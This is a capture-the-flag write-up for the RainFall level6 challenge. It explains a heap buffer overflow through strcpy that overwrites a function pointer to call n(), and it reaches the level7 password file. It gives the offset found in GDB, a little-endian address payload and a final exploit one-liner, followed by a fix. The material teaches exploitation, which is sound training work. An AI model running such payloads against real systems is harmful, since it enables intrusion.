# Heap Buffer Overflow → Function Pointer Overwrite (Level6)

## Objective

Exploit a **heap buffer overflow** to overwrite a **function pointer** and redirect execution to a useful function in the binary (`n()`).

## Overall concept

Unlike level5 (GOT overwrite), here we attack:

- **the heap** (dynamic memory)
- **a function pointer**

No GOT modification: the target is a pointer stored on the heap, next to a vulnerable buffer.

---

## Memory layout

```
High address
┌───────────────┐
│ Stack         │
├───────────────┤
│               │
│     Heap      │  ← malloc()
│               │
├───────────────┤
│ .bss / .data  │
├───────────────┤
│ Code (.text)  │
└───────────────┘
Low address
```

---

## Reconstructed code

```c
buf = malloc(0x40);    // 64 bytes (0x40 = 64 in decimal)
fn_ptr = malloc(4);    // function pointer

*fn_ptr = m;

strcpy(buf, argv[1]); // ⚠️ vulnerable

((void (*)(void))*fn_ptr)();
```

---

## Vulnerability

```c
strcpy(buf, argv[1]);
```

- Copy with **no limit**.
- Buffer = **64 bytes**.
- If input > 64 → overflow into the next block (the function pointer).

---

## Heap organisation

The heap is a **linear** memory region (like a byte array), organised in **chunks** (blocks with metadata):

```
[ metadata ][ buf (64 bytes) ][ metadata ][ fn_ptr (4 bytes) ]
```

By exceeding the buffer we overwrite the next region then **the function pointer**.

## Attack principle

```
Before:
[ buffer ][ fn_ptr ]   →  (*fn_ptr)() calls m()

After overflow:
[ overwritten buffer ][ overwritten fn_ptr ]   →  (*fn_ptr)() calls n()
```

We replace the **value** of `fn_ptr` (address of m) with the address of **n**.

---

## Exploit goal

Replace:

```c
*fp = m;
```

with:

```c
*fp = n;
```

---

## Normal execution flow

```
main
  ↓
(*fp)()
  ↓
m()
  ↓
"Nope"
```

---

## Execution flow after exploit

```
main
  ↓
(*fp)()
  ↓
n()
  ↓
system("/bin/cat /home/user/level7/.pass")
```

---

## Attack type

| Type                       | Description                    |
| -------------------------- | ------------------------------ |
| Heap overflow              | malloc buffer overflow         |
| Function pointer overwrite | Control of execution flow      |
| Code reuse                 | We use an existing function    |

---

## Offset calculation

- Buffer size: **64 bytes** (`0x40` in hex = 64 in decimal).
- Offset to the pointer depends on heap layout (metadata, alignment).

Test in GDB:

```bash
"A"*71 + "BBBB"  →  register ≠ 0x42424242  (incomplete overflow)
"A"*72 + "BBBB"  →  register = 0x42424242  (correct offset)
```

**Offset = 72 bytes** on RainFall.

---

## Endianness and `\x` notation

- Address of **n**: `0x08048454`.
- In **little-endian** (low byte first): `\x54\x84\x04\x08`.

**Meaning of `\x`**: in Python (or C), `\x54` is **one byte** of value 0x54. This allows writing **raw bytes** in the payload (addresses, shellcode, etc.), not just printable characters.

---

## Payload

```
[padding 72 bytes] + [address of n in LE]
```

```bash
"A"*72 + "\x54\x84\x04\x08"
```

---

## Final exploit

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

---

## Why it works

1. `strcpy` copies too much data.
2. Heap buffer overflow.
3. Function pointer overwrite.
4. The indirect call `(*fp)()` uses our address.
5. Execution of `n()` instead of `m()`.

---

## Comparison with Level5

| Level | Technique       | Target                    |
| ----- | --------------- | ------------------------- |
| 5     | GOT overwrite   | external function (libc)  |
| 6     | Heap overflow   | function pointer         |

---

## To check in GDB

```gdb
p n
disas main
break *0x080484d0
run $(python -c 'print "A"*72 + "BBBB"')
p/x $eax
```

(Adjust breakpoint address from main disassembly — just before the `call *%eax` instruction or equivalent.)

If overflow is correct: with "BBBB", `$eax` = 0x42424242; with address of **n** in LE, `$eax` = 0x08048454.

---

## Fix

Replace:

```c
strcpy(buf, argv[1]);
```

with:

```c
strncpy(buf, argv[1], 64);
```

or check length before copy:

```c
if (strlen(argv[1]) < 64)
    strcpy(buf, argv[1]);
```

---

## Mental summary

- **Heap** = linear memory in chunks (malloc).
- **strcpy** with no limit → overflow.
- **Overwrite** of function pointer → redirect flow to `n()`.
- No code injection → **code reuse** (reuse an existing function).

---

## Exam phrase

> The program allocates two consecutive blocks on the heap. By exploiting a buffer overflow via strcpy, we overwrite the function pointer and redirect execution to an existing function in the binary.

---

## References

- `strcpy(3)` (unbounded): https://man7.org/linux/man-pages/man3/strcpy.3.html
- Glibc malloc internals: https://sourceware.org/glibc/wiki/MallocInternals
